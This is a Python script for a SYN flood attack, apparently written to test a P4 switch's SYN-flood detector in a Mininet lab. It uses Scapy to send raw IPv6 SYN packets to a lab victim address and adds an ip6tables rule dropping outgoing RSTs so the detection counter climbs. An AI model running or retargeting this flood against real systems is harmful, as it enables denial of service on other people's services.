"""
attack.py — SYN Flood attacker script
Auto-detects own interface, self-assigns IPv6 if p4-utils didn't.
Uses Scapy sendp() — L2 injection, no kernel ARP/NDP needed.
Run from any attacker host xterm:
    python3 /home/ayush/my/attack.py
"""

import re, sys, time, logging, subprocess
from scapy.all import Ether, IPv6, TCP, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Enable IPv6 in this namespace (WSL2 disables it on new veth interfaces)
subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
subprocess.run(['sysctl', '-w', 'net.ipv6.conf.default.disable_ipv6=0'], capture_output=True)

# Block outgoing RSTs so h1's kernel doesn't undo the SYN counter.
# Scapy sends raw SYNs that bypass the kernel — when h0 replies SYN-ACK,
# h1's kernel sees an unexpected SYN-ACK and sends RST-ACK back,
# which hits P4's ACK branch and decrements the CMS counter to 0,
# preventing the threshold from ever being reached.
subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)   # flush first (clean state)
subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)

VICTIM_IP  = "2001:1:1::10"      # h0 IPv6 — matches network.py
VICTIM_MAC = "aa:00:00:00:00:00" # h0 MAC  — matches network.py
DST_PORT   = 80
NUM_PACKETS = 200
INTER       = 0.01   # 100 pps

# Must match network.py setIntfIp values
IPV6_MAP = {
    'h0': '2001:1:1::10',
    'h1': '2001:1:1::1',
    'h2': '2001:1:1::2',
    'h3': '2001:1:1::3',
    'h4': '2001:1:1::4',
    'h5': '2001:1:1::5',
}

def get_iface_info():
    # Detect interface (Mininet names it h1-eth0 — shows as h1-eth0@ifN in ip link)
    result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
    iface = None
    for line in result.stdout.split('\n'):
        m = re.search(r'\d+:\s+([\w-]+eth\d+)', line)
        if m:
            iface = m.group(1)
            break
    if not iface:
        print("ERROR: could not detect interface")
        sys.exit(1)

    # MAC
    result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
    mac_m = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
    mac = mac_m.group(1) if mac_m else None

    # IPv6 — detect from interface, or self-assign if p4-utils skipped it
    result = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True)
    ip6_m = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', result.stdout)
    if ip6_m:
        ipv6 = ip6_m.group(1)
    else:
        hostname = iface.split('-eth')[0]   # 'h1-eth0' → 'h1'
        ipv6 = IPV6_MAP.get(hostname)
        if ipv6:
            subprocess.run(['ip', '-6', 'addr', 'add', ipv6 + '/64', 'dev', iface],
                           capture_output=True)
            print(f"[attack] Assigned {ipv6}/64 to {iface}")
        else:
            print(f"ERROR: unknown host {hostname}, add to IPV6_MAP")
            sys.exit(1)

    return iface, mac, ipv6

iface, src_mac, src_ipv6 = get_iface_info()

if not src_mac:
    print(f"ERROR: could not detect MAC on {iface}")
    sys.exit(1)

print(f"[attack] Host  : {src_ipv6} ({src_mac}) on {iface}")
print(f"[attack] Target: {VICTIM_IP}:{DST_PORT}")
print(f"[attack] Sending {NUM_PACKETS} SYN packets at {int(1/INTER)} pps...")

for i in range(NUM_PACKETS):
    pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
           IPv6(src=src_ipv6, dst=VICTIM_IP) /
           TCP(sport=10000, dport=DST_PORT,
               flags="S", seq=1000 + i))
    sendp(pkt, iface=iface, verbose=0)
    time.sleep(INTER)

print(f"[attack] Done — {NUM_PACKETS} SYNs sent from {src_ipv6}")
